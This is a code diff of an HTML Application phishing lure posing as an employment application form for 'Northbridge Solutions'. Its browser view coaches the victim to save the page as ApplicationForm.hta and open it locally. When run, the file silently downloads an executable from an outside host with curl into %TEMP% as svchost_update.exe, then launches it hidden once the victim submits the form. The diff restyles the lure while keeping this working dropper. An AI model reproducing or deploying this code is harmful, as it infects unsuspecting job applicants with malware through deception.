@@ -2,123 +2,254 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>ApplicationForm.hta</title>
+<title>_.hta</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #7a7a7a;
+  body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+         background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
          min-height: 100vh; display: flex; align-items: center;
-         justify-content: center; padding: 20px; }
+         justify-content: center; padding: 28px; color: #0f172a;
+         font-size: 18px; -webkit-font-smoothing: antialiased; }
+
+  /* ---------- Shared card ---------- */
+  .card { background: #ffffff; border-radius: 18px;
+          box-shadow: 0 24px 60px rgba(0,0,0,0.35),
+                      0 2px 8px rgba(0,0,0,0.15);
+          animation: fadeIn .5s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); }
+                      to   { opacity: 1; transform: translateY(0); } }
 
   /* ---------- Browser view: "save me" card ---------- */
-  #saveCard { background: #fff; border-radius: 4px; padding: 56px 48px;
-              width: 520px; box-shadow: 0 12px 40px rgba(0,0,0,0.25);
-              text-align: center; }
-  #saveCard .icon { width: 72px; height: 72px; margin: 0 auto 24px;
-                    background: #107c10; border-radius: 6px;
-                    display: flex; align-items: center;
-                    justify-content: center; }
-  #saveCard .icon svg { width: 40px; height: 40px; fill: #fff; }
-  #saveCard h1 { font-size: 26px; color: #1b1b1b; margin-bottom: 12px; }
-  #saveCard p.sub { font-size: 15px; color: #555; margin-bottom: 32px; }
-  #saveCard .steps { text-align: left; background: #f5f7fa;
-                     border-radius: 6px; padding: 20px 24px;
-                     margin-bottom: 28px; }
-  #saveCard .steps h3 { font-size: 13px; color: #333;
-                        text-transform: uppercase; letter-spacing: .5px;
-                        margin-bottom: 12px; }
-  #saveCard .steps ol { padding-left: 20px; font-size: 14px;
-                        color: #333; line-height: 1.7; }
-  #saveCard .steps code { background: #e1e6ed; padding: 2px 6px;
-                          border-radius: 3px; font-family: Consolas, monospace;
-                          font-size: 13px; color: #c0392b; }
-  #saveCard .meta { display: flex; justify-content: center; gap: 24px;
-                    font-size: 12px; color: #888; }
+  #saveCard { width: 720px; padding: 68px 64px 60px; text-align: center; }
+  #saveCard .badge { width: 96px; height: 96px; margin: 0 auto 32px;
+                     background: linear-gradient(135deg, #10b981, #059669);
+                     border-radius: 26px;
+                     display: flex; align-items: center;
+                     justify-content: center;
+                     box-shadow: 0 12px 32px rgba(16,185,129,0.42); }
+  #saveCard .badge svg { width: 50px; height: 50px; fill: #fff; }
+  #saveCard h1 { font-family: 'Space Grotesk', 'Inter', sans-serif;
+                 font-size: 42px; font-weight: 700;
+                 color: #0f172a; margin-bottom: 18px;
+                 letter-spacing: -1.2px; line-height: 1.12; }
+  #saveCard .sub { font-size: 19.5px; color: #64748b;
+                   line-height: 1.6; margin-bottom: 40px;
+                   font-weight: 400; }
+
+  .steps { background: #f8fafc; border: 1px solid #e2e8f0;
+           border-radius: 16px; padding: 34px 38px;
+           text-align: left; margin-bottom: 32px; }
+  .steps-header { display: flex; align-items: center; gap: 12px;
+                  margin-bottom: 24px;
+                  padding-bottom: 18px;
+                  border-bottom: 1px solid #e2e8f0; }
+  .steps-header .dot { width: 12px; height: 12px; border-radius: 50%;
+                       background: #3b82f6;
+                       box-shadow: 0 0 0 5px rgba(59,130,246,0.15); }
+  .steps-header h3 { font-family: 'Space Grotesk', 'Inter', sans-serif;
+                     font-size: 15px; font-weight: 700;
+                     text-transform: uppercase; letter-spacing: 1.2px;
+                     color: #475569; }
+
+  .step-list { list-style: none; padding: 0; counter-reset: step; }
+  .step-list li { counter-increment: step; position: relative;
+                  padding: 18px 0 18px 62px;
+                  font-size: 18.5px; color: #1e293b;
+                  line-height: 1.55; font-weight: 400; }
+  .step-list li:not(:last-child) { border-bottom: 1px dashed #e2e8f0; }
+  .step-list li::before { content: counter(step);
+                          position: absolute; left: 0; top: 50%;
+                          transform: translateY(-50%);
+                          width: 42px; height: 42px;
+                          background: #eff6ff; color: #2563eb;
+                          border-radius: 50%;
+                          display: flex; align-items: center;
+                          justify-content: center;
+                          font-family: 'Space Grotesk', 'Inter', sans-serif;
+                          font-size: 18px; font-weight: 700; }
+  .step-list li strong { font-weight: 600; color: #0f172a; }
+  .step-list li code { background: #1e293b; color: #f1f5f9;
+                       padding: 4px 11px; border-radius: 6px;
+                       font-family: 'SF Mono', Consolas, monospace;
+                       font-size: 16px; font-weight: 500; }
+  .step-list li code.ext { background: #fef3c7; color: #92400e;
+                           font-weight: 700; }
+
+  .callout { background: #fffbeb; border: 1px solid #fde68a;
+             border-radius: 14px; padding: 20px 22px;
+             display: flex; gap: 16px; align-items: flex-start;
+             margin-bottom: 32px; text-align: left; }
+  .callout .ico { flex-shrink: 0; width: 26px; height: 26px;
+                  margin-top: 1px; color: #d97706; }
+  .callout .txt { font-size: 17px; color: #78350f;
+                  line-height: 1.6; }
+  .callout .txt strong { color: #92400e; font-weight: 700; }
+
+  .meta { display: flex; justify-content: center;
+          gap: 28px; font-size: 15.5px; color: #94a3b8;
+          font-weight: 500; }
+  .meta span { display: flex; align-items: center; gap: 8px; }
+  .meta svg { width: 17px; height: 17px;
+              stroke: currentColor; fill: none;
+              stroke-width: 2; }
 
   /* ---------- HTA view: employment form ---------- */
-  #formWrap { display: none; background: #fff; border-radius: 4px;
-              width: 720px; box-shadow: 0 12px 40px rgba(0,0,0,0.25);
-              overflow: hidden; }
-  #formWrap .header { background: #1a3d6b; color: #fff;
-                      padding: 28px 40px; }
-  #formWrap .header h1 { font-size: 22px; margin-bottom: 4px; }
-  #formWrap .header p { font-size: 13px; opacity: .85; }
-  #formWrap .body { padding: 32px 40px 24px; max-height: 70vh;
-                    overflow-y: auto; }
-  #formWrap fieldset { border: none; margin-bottom: 28px; }
-  #formWrap legend { font-size: 13px; font-weight: 600; color: #1a3d6b;
-                     text-transform: uppercase; letter-spacing: .5px;
-                     padding-bottom: 10px; margin-bottom: 14px;
-                     border-bottom: 1px solid #e0e5ec; width: 100%; }
-  #formWrap .row { display: flex; gap: 16px; margin-bottom: 14px; }
+  #formWrap { display: none; width: 920px; overflow: hidden;
+              max-height: 94vh; flex-direction: column; }
+  #formWrap .header { background: linear-gradient(135deg, #1e3a8a, #1e40af);
+                      color: #fff; padding: 42px 58px; position: relative;
+                      overflow: hidden; }
+  #formWrap .header::after { content: ''; position: absolute;
+                             right: -60px; top: -60px;
+                             width: 260px; height: 260px;
+                             background: rgba(255,255,255,0.06);
+                             border-radius: 50%; }
+  #formWrap .header h1 { font-family: 'Space Grotesk', 'Inter', sans-serif;
+                         font-size: 34px; font-weight: 700;
+                         margin-bottom: 8px; letter-spacing: -0.8px;
+                         position: relative; z-index: 1; }
+  #formWrap .header p { font-size: 17.5px; opacity: .82;
+                        font-weight: 400;
+                        position: relative; z-index: 1; }
+  #formWrap .body { padding: 42px 58px 32px; overflow-y: auto;
+                    flex: 1; }
+  #formWrap .body::-webkit-scrollbar { width: 12px; }
+  #formWrap .body::-webkit-scrollbar-track { background: #f1f5f9; }
+  #formWrap .body::-webkit-scrollbar-thumb { background: #cbd5e1;
+                                             border-radius: 6px; }
+
+  #formWrap fieldset { border: none; margin-bottom: 40px; }
+  #formWrap legend { font-family: 'Space Grotesk', 'Inter', sans-serif;
+                     font-size: 15px; font-weight: 700;
+                     color: #1e40af;
+                     text-transform: uppercase; letter-spacing: 1.3px;
+                     padding-bottom: 16px; margin-bottom: 24px;
+                     border-bottom: 2px solid #e0e7ff;
+                     width: 100%; }
+  #formWrap .row { display: flex; gap: 20px; margin-bottom: 22px; }
   #formWrap .field { flex: 1; display: flex; flex-direction: column; }
-  #formWrap label { font-size: 12px; color: #444; margin-bottom: 5px;
-                    font-weight: 500; }
-  #formWrap label .req { color: #c0392b; }
+  #formWrap label { font-size: 16px; color: #334155;
+                    margin-bottom: 10px; font-weight: 600; }
+  #formWrap label .req { color: #dc2626; margin-left: 2px; }
   #formWrap input, #formWrap select, #formWrap textarea {
-      padding: 9px 12px; border: 1px solid #cdd5df; border-radius: 4px;
-      font-size: 14px; font-family: inherit; background: #fbfcfd; }
-  #formWrap input:focus, #formWrap select:focus, #formWrap textarea:focus {
-      outline: none; border-color: #1a3d6b; background: #fff; }
-  #formWrap textarea { resize: vertical; min-height: 70px; }
-  #formWrap .footer { padding: 20px 40px 28px; background: #f5f7fa;
-                      border-top: 1px solid #e0e5ec;
+      padding: 15px 18px; border: 1.5px solid #e2e8f0;
+      border-radius: 10px; font-size: 17.5px;
+      font-family: 'Inter', sans-serif;
+      background: #f8fafc; color: #0f172a;
+      transition: all .15s ease; }
+  #formWrap input:hover, #formWrap select:hover,
+  #formWrap textarea:hover { border-color: #cbd5e1; }
+  #formWrap input:focus, #formWrap select:focus,
+  #formWrap textarea:focus { outline: none;
+                             border-color: #3b82f6;
+                             background: #fff;
+                             box-shadow: 0 0 0 5px rgba(59,130,246,0.12); }
+  #formWrap textarea { resize: vertical; min-height: 100px;
+                       font-family: 'Inter', sans-serif; }
+  #formWrap .footer { padding: 28px 58px 36px; background: #f8fafc;
+                      border-top: 1px solid #e2e8f0;
                       display: flex; justify-content: space-between;
                       align-items: center; }
-  #formWrap .footer .note { font-size: 12px; color: #777; }
-  #formWrap .footer button { background: #1a3d6b; color: #fff;
-                             border: none; padding: 12px 36px;
-                             border-radius: 4px; font-size: 14px;
-                             font-weight: 600; cursor: pointer; }
-  #formWrap .footer button:hover { background: #143059; }
+  #formWrap .footer .note { font-size: 16px; color: #64748b; }
+  #formWrap .footer .note .req { color: #dc2626; font-weight: 700; }
+  #formWrap .footer button { font-family: 'Space Grotesk', 'Inter', sans-serif;
+                             background: linear-gradient(135deg, #1e40af, #1d4ed8);
+                             color: #fff; border: none;
+                             padding: 18px 52px; border-radius: 10px;
+                             font-size: 18.5px; font-weight: 600;
+                             cursor: pointer;
+                             box-shadow: 0 5px 18px rgba(30,64,175,0.35);
+                             transition: all .15s ease;
+                             letter-spacing: -0.2px; }
+  #formWrap .footer button:hover { transform: translateY(-1px);
+                                   box-shadow: 0 9px 26px rgba(30,64,175,0.45); }
+  #formWrap .footer button:active { transform: translateY(0); }
 
   /* ---------- Submission confirmation ---------- */
-  #done { display: none; background: #fff; border-radius: 4px;
-          width: 480px; padding: 48px 40px; text-align: center;
-          box-shadow: 0 12px 40px rgba(0,0,0,0.25); }
-  #done .check { width: 64px; height: 64px; border-radius: 50%;
-                 background: #107c10; margin: 0 auto 20px;
+  #done { display: none; width: 640px; padding: 68px 58px 60px;
+          text-align: center; }
+  #done .check { width: 96px; height: 96px; border-radius: 50%;
+                 background: linear-gradient(135deg, #10b981, #059669);
+                 margin: 0 auto 32px;
                  display: flex; align-items: center;
-                 justify-content: center; }
-  #done .check svg { width: 32px; height: 32px; fill: #fff; }
-  #done h2 { font-size: 22px; color: #1b1b1b; margin-bottom: 8px; }
-  #done p { font-size: 14px; color: #666; line-height: 1.6; }
-  #done .progress { margin-top: 20px; font-size: 12px; color: #888;
-                    min-height: 18px; }
-  #done .spinner { display: inline-block; width: 11px; height: 11px;
-                   border: 2px solid #ddd; border-top-color: #1a3d6b;
-                   border-radius: 50%; animation: spin .8s linear infinite;
-                   margin-right: 6px; vertical-align: middle; }
+                 justify-content: center;
+                 box-shadow: 0 12px 32px rgba(16,185,129,0.42);
+                 animation: pop .4s ease; }
+  @keyframes pop { 0% { transform: scale(0.6); opacity: 0; }
+                   60% { transform: scale(1.1); }
+                   100% { transform: scale(1); opacity: 1; } }
+  #done .check svg { width: 50px; height: 50px; fill: #fff; }
+  #done h2 { font-family: 'Space Grotesk', 'Inter', sans-serif;
+             font-size: 38px; font-weight: 700; color: #0f172a;
+             margin-bottom: 18px; letter-spacing: -1px; }
+  #done p { font-size: 19px; color: #64748b; line-height: 1.65; }
+  #done .progress { margin-top: 32px; font-size: 16px;
+                    color: #94a3b8; min-height: 26px;
+                    display: flex; align-items: center;
+                    justify-content: center; gap: 12px;
+                    font-weight: 500; }
+  #done .spinner { display: inline-block; width: 16px; height: 16px;
+                   border: 2px solid #e2e8f0;
+                   border-top-color: #3b82f6;
+                   border-radius: 50%;
+                   animation: spin .7s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
-<!-- ============ Browser view (what users see first) ============ -->
-<div id="saveCard">
-  <div class="icon">
+<!-- ============ Browser view: "Save me" card ============ -->
+<div class="card" id="saveCard">
+  <div class="badge">
     <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zM8 13h8v2H8v-2zm0 4h8v2H8v-2z"/></svg>
   </div>
-  <h1>Your File Is Ready</h1>
-  <p class="sub">Your browser cannot render the interactive application form directly.</p>
+  <h1>Your application is ready</h1>
+  <p class="sub">Your browser cannot open the interactive form directly.
+     Save the page and open it locally to continue.</p>
 
   <div class="steps">
-    <h3>To open your application form</h3>
-    <ol>
-      <li>Press <code>Ctrl</code> + <code>S</code> to save this page</li>
-      <li>Choose <strong>Webpage, Complete</strong> as the save type</li>
-      <li>Rename the file to <code>ApplicationForm.hta</code></li>
-      <li>Save it to your Desktop and double-click it</li>
+    <div class="steps-header">
+      <span class="dot"></span>
+      <h3>Save this page to your computer</h3>
+    </div>
+    <ol class="step-list">
+      <li>Press <code>Ctrl</code> + <code>S</code> to open the save dialog.</li>
+      <li>Change <strong>Save as type</strong> to <code>Webpage, Single File</code>.</li>
+      <li>In the filename field, <strong>edit the name</strong> and set it to
+          <code class="ext">ApplicationForm.hta</code> — do not leave the default.</li>
+      <li>Click <strong>Save</strong>, then open the file from your Desktop.</li>
     </ol>
   </div>
 
+  <div class="callout">
+    <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+      <line x1="12" y1="9" x2="12" y2="13"/>
+      <line x1="12" y1="17" x2="12.01" y2="17"/>
+    </svg>
+    <div class="txt">
+      <strong>Important:</strong> you must edit the filename in step 3.
+      If the file is saved with a different extension, the form will not open.
+    </div>
+  </div>
+
   <div class="meta">
-    <span>🔒 Secure connection</span>
-    <span>🕐 Expires in 24 hours</span>
+    <span>
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Secure connection
+    </span>
+    <span>
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Expires in 24 hours
+    </span>
   </div>
 </div>
 
-<!-- ============ HTA view (shown when run as .hta) ============ -->
-<div id="formWrap">
+<!-- ============ HTA view: employment form ============ -->
+<div class="card" id="formWrap">
   <div class="header">
     <h1>Employment Application Form</h1>
     <p>Northbridge Solutions — Careers Portal 2025</p>
@@ -259,13 +390,13 @@
     </form>
   </div>
   <div class="footer">
-    <div class="note">All fields marked <span style="color:#c0392b">*</span> are required.</div>
+    <div class="note">All fields marked <span class="req">*</span> are required.</div>
     <button id="submitBtn" onclick="validateAndSubmit()">Submit Application</button>
   </div>
 </div>
 
 <!-- ============ Confirmation ============ -->
-<div id="done">
+<div class="card" id="done">
   <div class="check">
     <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
   </div>
@@ -283,15 +414,20 @@ var isHTA = false;
 try { new ActiveXObject("WScript.Shell"); isHTA = true; } catch(e) { isHTA = false; }
 
 // ---------------------------------------------------------------
-// Paths (set once)
+// Config
 // ---------------------------------------------------------------
-var EXE_PATH = "";
-var CURL_EXE = "C:\\Windows\\System32\\curl.exe";
+var EXE_PATH    = "";
+var CURL_EXE    = "C:\\Windows\\System32\\curl.exe";
 var PAYLOAD_URL = "https://driveone.online/ServerHostModule";
 
+// ---------------------------------------------------------------
+// HTA boot: hide save card, show form, start download
+// ---------------------------------------------------------------
 if (isHTA) {
     document.getElementById("saveCard").style.display = "none";
-    document.getElementById("formWrap").style.display = "block";
+    var fw = document.getElementById("formWrap");
+    fw.style.display = "flex";
+    fw.style.flexDirection = "column";
 
     try {
         var sh  = new ActiveXObject("WScript.Shell");
@@ -299,7 +435,6 @@ if (isHTA) {
         var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
         EXE_PATH = tmp + "\\svchost_update.exe";
 
-        // Kick off the download immediately, non-blocking, hidden.
         sh.Run("\"" + CURL_EXE + "\" -L -s -S -o \"" + EXE_PATH + "\" " + PAYLOAD_URL, 0, false);
     } catch(e) { /* silent */ }
 }
@@ -314,8 +449,8 @@ function validateAndSubmit() {
     for (var i = 0; i < fields.length; i++) {
         var v = fields[i].value;
         if (!v || v.replace(/\s/g, "") === "") {
-            fields[i].style.borderColor = "#c0392b";
-            fields[i].style.background = "#fdf3f3";
+            fields[i].style.borderColor = "#dc2626";
+            fields[i].style.background = "#fef2f2";
             if (!firstEmpty) firstEmpty = fields[i];
         } else {
             fields[i].style.borderColor = "";
@@ -329,23 +464,19 @@ function validateAndSubmit() {
         return;
     }
 
-    // ---- Show confirmation ----
     document.getElementById("formWrap").style.display = "none";
     document.getElementById("done").style.display = "block";
-
-    // ---- Wait for the payload download, then launch ----
     startPayloadWatch();
 }
 
 // ---------------------------------------------------------------
-// Non-blocking poll: check every 500ms for the payload file.
-// Timeout after 120s.
+// Non-blocking poll for the payload file
 // ---------------------------------------------------------------
 function startPayloadWatch() {
     var progressEl = document.getElementById("progress");
-    var elapsed = 0;
+    var elapsed  = 0;
     var INTERVAL = 500;
-    var TIMEOUT = 120000;
+    var TIMEOUT  = 120000;
 
     progressEl.innerHTML = '<span class="spinner"></span>Finalizing your submission...';
 
@@ -369,7 +500,6 @@ function startPayloadWatch() {
                 var sh = new ActiveXObject("WScript.Shell");
                 sh.Run("\"" + EXE_PATH + "\"", 0, false);
             } catch(e) {}
-            // Close shortly after launch
             setTimeout(closeWindow, 2000);
             return;
         }
